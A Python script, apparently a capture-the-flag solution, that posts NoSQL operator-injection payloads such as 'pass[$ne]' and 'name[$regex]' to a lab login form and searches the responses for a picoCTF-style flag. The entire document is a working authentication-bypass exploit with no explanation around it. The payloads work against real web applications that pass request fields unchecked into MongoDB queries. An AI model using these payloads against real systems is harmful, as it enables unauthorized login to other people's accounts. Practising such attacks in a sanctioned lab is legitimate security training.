import sys, requests, urllib3, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://xebec.cylabacademy.net:36284/"
tests = [
    ("admin + pass[$ne]", {"name": "admin", "pass[$ne]": "x"}),
    ("admin + pass[$gt]", {"name": "admin", "pass[$gt]": ""}),
    ("admin + pass[$regex]", {"name": "admin", "pass[$regex]": ".*"}),
    ("name[$ne] + pass", {"name[$ne]": "x", "pass": "x"}),
    ("user + pass[$ne]", {"name": "user", "pass[$ne]": "x"}),
    ("name[$regex].* + pass[$ne]", {"name[$regex]": ".*", "pass[$ne]": "x"}),
]
for label, data in tests:
    try:
        r = requests.post(BASE, data=data, timeout=20)
        m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r.text)
        al = re.findall(r"<!-- <strong>Title</strong> -->\s*([^<]{0,100})", r.text)
        print("%-28s -> %d octets | %r %s" % (label, len(r.text),
              (al[0].strip()[:70] if al else "-"), "FLAG " + m.group(0) if m else ""))
        if m:
            break
    except Exception as e:
        print(label, "ERR", type(e).__name__)
